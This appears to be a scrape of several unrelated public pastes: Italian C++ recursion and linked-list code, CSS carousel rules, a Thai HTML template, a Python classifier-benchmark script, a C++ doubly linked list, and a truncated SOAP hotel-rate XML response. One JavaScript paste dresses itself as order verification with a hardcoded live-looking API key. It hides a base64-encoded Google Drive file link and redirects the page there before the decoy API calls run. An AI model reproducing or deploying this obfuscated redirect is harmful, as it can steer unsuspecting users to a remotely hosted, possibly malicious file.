    nuovo->next = nullptr;
  }
}

void stampa_dalla_coda(Nodo *p, int profondita, int &massima)
{
  massima = max(profondita, massima);

  if (p!=nullptr)
    stampa_dalla_coda(p->next, profondita+1, massima);
}


//Equazione di ricorrenza temporale: T(n) = 2*T(n/2) + O(n)
//Equazione di ricorrenza spaziale: T(n) = T(n/2) + O(1)
//Complessità temporale: O(nlog(n))
//Complessità spaziale: O(log(n))
void stampaInvertita(Nodo *testa,int  dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return;
    //Lista con un solo elemento
    if (testa->next == nullptr)
        ;//cout << testa->dato << endl;
        //Passo ricorsivo
    else{
        Nodo* attuale = testa;
        //Suddivido in due metà la lista
        for (int i = 0; i < dim/2 - 1; ++i) {
            attuale = attuale->next;
        }
        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        stampaInvertita(attuale, dim/2);
        stampaInvertita(testa, dim - dim/2);

        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;
    }
}

//credits Alex-qk5ei (youtube)
int stampaInvertitaMisuraStack(Nodo *testa, int dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return 1;
    //Lista con un solo elemento
    if (testa->next == nullptr) {
        ;//cout << testa->dato << endl;
        return 1;
    }
    //Passo ricorsivo
    else{
        Nodo* attuale = testa;

        //Suddivido in due metà la lista
        for (int i = 0; i < (dim>>1) - 1; ++i) {
            attuale = attuale->next;
        }

        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        /*La profondità massima dello stack P(n) può essere definita ricorsivamente come: P(n) = max(P(n/2), P(n-n/2)) + 1
        L'addendo 1 equivale alla presenza sullo stack del record di attivazione corrente
        Inoltre, considerando che n-n/2 >= n/2 in ogni caso, max(P(n/2), P(n-n/2)) = P(n-n/2) e, conseguentemente
        P(n) = P(n-n/2) + 1
        L'istruzione sottostante rappresenta dunque la profondità massima che andrà restituita al metodo chiamante
        */
        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        int profondita = stampaInvertitaMisuraStack(attuale, dim - (dim>>1)) + 1;
        stampaInvertitaMisuraStack(testa, dim>>1);
        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;

        return profondita;
    }
}

int fattoriale(int n)
{
   if (n == 0)
    return 1;
   else
     return n * fattoriale(n - 1);
}


int fattoriale_tail(int n, int accumulatore=1)
{
   if (n == 0)
    return accumulatore;
   else
    return fattoriale_tail(n - 1, n * accumulatore);
}


enum Comando {START, STOP};
auto Cronometro(Comando comando = Comando::START)
{
  static std::chrono::time_point<std::chrono::system_clock> inizio;
  static std::chrono::time_point<std::chrono::system_clock> fine;

  if (comando == Comando::START)
  {
    inizio = chrono::high_resolution_clock::now();
    fine = inizio;
  }
  else
    fine = chrono::high_resolution_clock::now();


  return chrono::duration_cast<std::chrono::milliseconds>(fine - inizio).count();
}








void stampaInvertitaVector(Nodo *il)
{
  vector<Nodo*> v;

  while(il!=nullptr)
  {
    v.push_back(il);
    il = il-> next;
  }

  for (int i=v.size()-1; i>=0; i--);
    //cout << v[i] -> dato << "" "";
}








void InvertiLista(Nodo *&il)
{

  Nodo * precedente = nullptr;
  Nodo * corrente=il;
  Nodo * successivo = nullptr;

  while(corrente!=nullptr)
  {
    successivo = corrente->next;
    corrente->next =  precedente;

    precedente = corrente;
    corrente = successivo;
  }

  il=precedente;
}





void stampa(Nodo *p)
{
  while (p!=nullptr)
  {
    //cout << p->dato << "" "";

    //al prossimo nodo
    p = p->next;
  }
}

// Struttura per rappresentare una ""mossa""
struct HanoiMove {
    int n;          // Numero di dischi
    char from;      // Piolo di partenza (A, B, C)
    char to;        // Piolo di destinazione
    char aux;       // Piolo ausiliario
};

// Versione iterativa senza STL (stack manuale)
void hanoi_iterative_no_stl(int n, char from = 'A', char to = 'C', char aux = 'B') {
    const int MAX_STACK_SIZE = 1000; // Dimensione massima dello stack
    HanoiMove stack[MAX_STACK_SIZE];
    int top = -1; // Inizializza lo stack vuoto

    // Simula la prima chiamata ricorsiva
    stack[++top] = {n, from, to, aux};

    while (top >= 0) { // Finché lo stack non è vuoto
        HanoiMove current = stack[top--]; // Pop

        if (current.n == 1) {
            // Caso base: sposta il disco
            cout << ""Muovi disco 1 da "" << current.from << "" a "" << current.to << endl;
        } else {
            // Simula le chiamate ricorsive in ordine inverso (LIFO)
            // 1. hanoi(n-1, aux, to, from)
            stack[++top] = {current.n - 1, current.aux, current.to, current.from};
            // 2. Sposta il disco n da from a to (caso base fittizio)
            stack[++top] = {1, current.from, current.to, current.aux};
            // 3. hanoi(n-1, from, aux, to)
            stack[++top] = {current.n - 1, current.from, current.aux, current.to};
        }
    }
}


void hanoi(int n, char from = 'A', char to = 'C', char aux = 'B') {
    if (n == 1) {
        cout << ""Muovi disco 1 da "" << from << "" a "" << to << endl;
        return;
    }
    hanoi(n - 1, from, aux, to);  // Sposta n-1 dischi da 'from' a 'aux'
    cout << ""Muovi disco "" << n << "" da "" << from << "" a "" << to << endl;
    hanoi(n - 1, aux, to, from);  // Sposta n-1 dischi da 'aux' a 'to'
}

int main()
{
    //cout << fattoriale_tail(60001) << endl;
    //hanoi_iterative_no_stl(3);

    string dati_prova[] = {""abaco"", ""amo"", ""bicicletta"", ""cane"", ""canguro"", ""mare"", ""sale"", ""zebra""};

    Nodo *il = nullptr;

    int quante_run=10000;
    int num_ele = 20000;

    for (int i=0; i<num_ele; i++)
      ins_testa(il, new Nodo{dati_prova[i%8]});

    //stampaInvertitaVector(il);

//    stampa(il);
//    InvertiLista(il);
//    stampa(il);
//    InvertiLista(il);
//    stampa(il);



    //CON RICORSIONE E DIVIDE ET IMPERA
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertita(il,num_ele);
    cout << ""Ricorsione con divide/impera: "" << Cronometro(Comando::STOP) << endl;

    //CON VECTOR DI APPOGGIO
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertitaVector(il);
    cout << ""Iterativa con vector di puntatori: "" << Cronometro(Comando::STOP) << endl;


    //CON INVERSIONE PUNTATORI
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
    {
      InvertiLista(il);
      stampa(il);
      InvertiLista(il);
    }
    cout << ""Iterativa con inversione fisica lista: "" << Cronometro(Comando::STOP) << endl;



    return 0;
}
"
UaMgzu6w,Untitled,s-sols,CSS,Wednesday 2nd of April 2025 12:47:24 PM CDT,":is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 12px;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 7);
display: none;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-of-type(-n+4) {
display: block;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(-n+3) {
display: block;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(1) {
order: -1;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(2) {
order: -2;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(3) {
order: -3;
}

@media screen and (max-width: 1599px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 6);
}
}

@media screen and (max-width: 1399px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 5);
}
}

@media screen and (max-width: 1199px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 4);
}
}

@media screen and (max-width: 991px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 85px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
}
}

@media screen and (max-width: 799px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 60px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 3);
}
}"
dX6W82Tv,Basket Boy | กระทู้โรลเพลย์,Kelly-B9978,HTML,Wednesday 2nd of April 2025 12:35:30 PM CDT,"<!-- อาคารเรียน -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">School Building</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>

<!-- พื้นที่รอบนอก -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Outdoor Area</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>"
1XmdCcCe,Untitled,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:32:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/426/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waHhAZZv,latency model size compute,mayankjoin3,Python,Wednesday 2nd of April 2025 12:30:36 PM CDT,"import pandas as pd
import time
import psutil
import os
from sklearn.model_selection import StratifiedKFold
from sklearn.ensemble import ExtraTreesClassifier
from sklearn.metrics import classification_report
import joblib
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder
import numpy as np

# Step 1: Load the data
file_path = ""m5.csv""
df = pd.read_csv(file_path)

# Preprocessing: If categorical columns exist, encode them
label_encoder = LabelEncoder()

# Assuming 'category' column is the target and there may be categorical features
# Encode categorical features if needed, e.g., if there are string columns
# Here we will assume 'category' is the target and all other columns are features
X = df.drop(columns=['label'])
y = df['label']

# Encoding categorical features (if they exist)
X = X.apply(lambda col: label_encoder.fit_transform(col.astype(str)), axis=0, result_type='expand')

# Step 2: Initialize the ExtraTreesClassifier
clf = ExtraTreesClassifier(random_state=42, n_jobs=-1)  # n_jobs=-1 allows for parallel processing

# Step 3: Set up 2-Fold Cross-Validation
skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)

# Step 4: Evaluate Model Using Cross-Validation
fold = 1
for train_index, test_index in skf.split(X, y):
    print(f""Fold {fold}..."")
    X_train, X_test = X.iloc[train_index], X.iloc[test_index]
    y_train, y_test = y.iloc[train_index], y.iloc[test_index]

    # Step 5: Train the model
    start_time = time.time()
    clf.fit(X_train, y_train)
    training_time = time.time() - start_time
    print(f""Training time for fold {fold}: {training_time:.4f} seconds"")

    # Step 6: Test the model and measure latency
    start_time = time.time()
    predictions = clf.predict(X_test)
    prediction_time = time.time() - start_time
    print(f""Prediction time for fold {fold}: {prediction_time:.4f} seconds per instance"")

    # Step 7: Memory and CPU Usage during prediction
    process = psutil.Process(os.getpid())
    memory_before = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_before = psutil.cpu_percent(interval=1)

    # Perform prediction to measure CPU and Memory usage
    clf.predict(X_test)

    memory_after = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_after = psutil.cpu_percent(interval=1)

    memory_usage = memory_after - memory_before
    cpu_usage = cpu_after - cpu_before

    print(f""Memory usage during prediction: {memory_usage:.4f} MB"")
    print(f""CPU usage during prediction: {cpu_usage:.4f}%"")

    # Step 8: Output classification report
    # print(""Classification Report:"")
    # print(classification_report(y_test, predictions))

    # Step 9: Model size on disk
    model_filename = f'extratrees_model_fold{fold}.pkl'
    joblib.dump(clf, model_filename)
    model_size = os.path.getsize(model_filename) / (1024 * 1024)  # in MB
    print(f""Model size for fold {fold}: {model_size:.4f} MB"")

    fold += 1
"
bhVtV9Mn,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 12:28:16 PM CDT,"#include <iostream>
using namespace std;


struct node {
    int info;
    node * next;
    node * prev;
};

struct DLL {
    node * head;
    
    void init() {
        head = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
        }
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            node * tmp = head;
            while(tmp->next != NULL) {
                tmp = tmp->next;
            }
            
            tmp->next = new_node;
            new_node->prev = tmp;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                head = head->next;
                delete head->prev;
                head->prev = NULL;
            }
        }
    }
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                node * tmp = head;
                while(tmp->next != NULL) {
                    tmp = tmp->next;
                }
                tmp->prev->next = NULL;
                delete tmp;
                tmp = NULL;
            }
        }
    }
    
    void deleteAll() {
        while(head != NULL) {
            deleteEnd();
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp->info != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    void print() {
        node * tmp = head, * last;
        while(tmp != NULL) {
            last = tmp;
            cout << tmp->info << ""->"";
            tmp = tmp -> next;
        }
        cout << endl;
        
        while(last != NULL) {
            cout << last->info << ""<--"";
            last = last->prev;
        }
        cout << endl;
    }
};
int main() {
    DLL dll;
    dll.init();
    
    dll.insertFront(1);
    dll.insertFront(2);
    dll.insertFront(3);
    
    
    dll.insertEnd(4);
    dll.insertEnd(5);
    dll.insertEnd(6);
    dll.print();
    
    dll.deleteNode(4);
    dll.print();
    
    return 0;
}
"
zHtb9MjH,Untitled,BrycePate,XML,Wednesday 2nd of April 2025 12:20:59 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:wsa=""http://schemas.xmlsoap.org/ws/2004/08/addressing"" xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"" xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
   <soap:Header>
      <wsa:Action>hotelrateinquiryResponse</wsa:Action>
      <wsa:MessageID>urn:uuid:e6fe5b1d-720e-4073-89a7-6e8e3bb0067e</wsa:MessageID>
      <wsa:RelatesTo>urn:uuid:2f05b040-4fd6-4da5-9717-f858f7c73d8f</wsa:RelatesTo>
      <wsa:To>http://www.w3.org/2005/08/addressing/role/anonymous</wsa:To>
      <wsse:Security>
         <wsu:Timestamp wsu:Id=""Timestamp-4604d32f-83ee-427c-8cd3-2270571d7284"">
            <wsu:Created>2025-04-02T17:14:52Z</wsu:Created>
            <wsu:Expires>2025-04-02T17:19:52Z</wsu:Expires>
         </wsu:Timestamp>
      </wsse:Security>
   </soap:Header>
   <soap:Body>
      <hotelrateresults arrival=""2025-04-17"" depart=""2025-04-20"" group="""" corporate="""" secretary="""" agent="""">
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>N1SC</unittype>
            <unitnumber />
            <unitdescription>Shoshone 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>335.3000</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>963.0700</unitrate>
            <subtotal>801.0700</subtotal>
            <extras>162.0000</extras>
            <grats>80.1100</grats>
            <taxes>102.5400</taxes>
            <package>963.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>162.0000</batchedextras>
            <total amount=""1145.7200"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U9SM</unittype>
            <unitnumber />
            <unitdescription>Summit QM Studio</unitdescription>
            <unitpic />
            <firstnite>409.0100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>948.0700</unitrate>
            <subtotal>948.0700</subtotal>
            <extras>0.0000</extras>
            <grats>94.8100</grats>
            <taxes>121.3500</taxes>
            <package>948.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1164.2300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U0SQ</unittype>
            <unitnumber />
            <unitdescription>Summit 2Q</unitdescription>
            <unitpic />
            <firstnite>531.8100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1273.0700</unitrate>
            <subtotal>1273.0700</subtotal>
            <extras>0.0000</extras>
            <grats>127.3100</grats>
            <taxes>162.9500</taxes>
            <package>1273.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1563.3300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U0DA</unittype>
            <unitnumber />
            <unitdescription>Summit Mobility K</unitdescription>
            <unitpic />
            <firstnite>568.6500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1253.0700</unitrate>
            <subtotal>1253.0700</subtotal>
            <extras>0.0000</extras>
            <grats>125.3100</grats>
            <taxes>160.3900</taxes>
            <package>1253.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1538.7700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1SC</unittype>
            <unitnumber />
            <unitdescription>Summit Q,QS 1 Bed</unitdescription>
            <unitpic />
            <firstnite>697.5900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1678.0700</unitrate>
            <subtotal>1678.0700</subtotal>
            <extras>0.0000</extras>
            <grats>167.8100</grats>
            <taxes>214.7900</taxes>
            <package>1678.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2060.6700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U2SCC</unittype>
            <unitnumber />
            <unitdescription>Summit 3Q 2 Bed</unitdescription>
            <unitpic />
            <firstnite>998.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2658.0700</unitrate>
            <subtotal>2658.0700</subtotal>
            <extras>0.0000</extras>
            <grats>265.8100</grats>
            <taxes>340.2300</taxes>
            <package>2658.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3264.1100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U3SCC</unittype>
            <unitnumber />
            <unitdescription>Summit 3 Bed</unitdescription>
            <unitpic />
            <firstnite>1919.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>4708.0700</unitrate>
            <subtotal>4708.0700</subtotal>
            <extras>0.0000</extras>
            <grats>470.8100</grats>
            <taxes>602.6300</taxes>
            <package>4708.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""5781.5100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1001P</unittype>
            <unitnumber />
            <unitdescription>3 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>4989.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>12268.0700</unitrate>
            <subtotal>12268.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1226.8100</grats>
            <taxes>1570.3100</taxes>
            <package>12268.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""15065.1900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1005P</unittype>
            <unitnumber />
            <unitdescription>3 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>3515.8500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>8648.0700</unitrate>
            <subtotal>8648.0700</subtotal>
            <extras>0.0000</extras>
            <grats>864.8100</grats>
            <taxes>1106.9500</taxes>
            <package>8648.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""10619.8300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1006P</unittype>
            <unitnumber />
            <unitdescription>5 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>5542.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>13638.0700</unitrate>
            <subtotal>13638.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1363.8100</grats>
            <taxes>1745.6700</taxes>
            <package>13638.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""16747.5500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
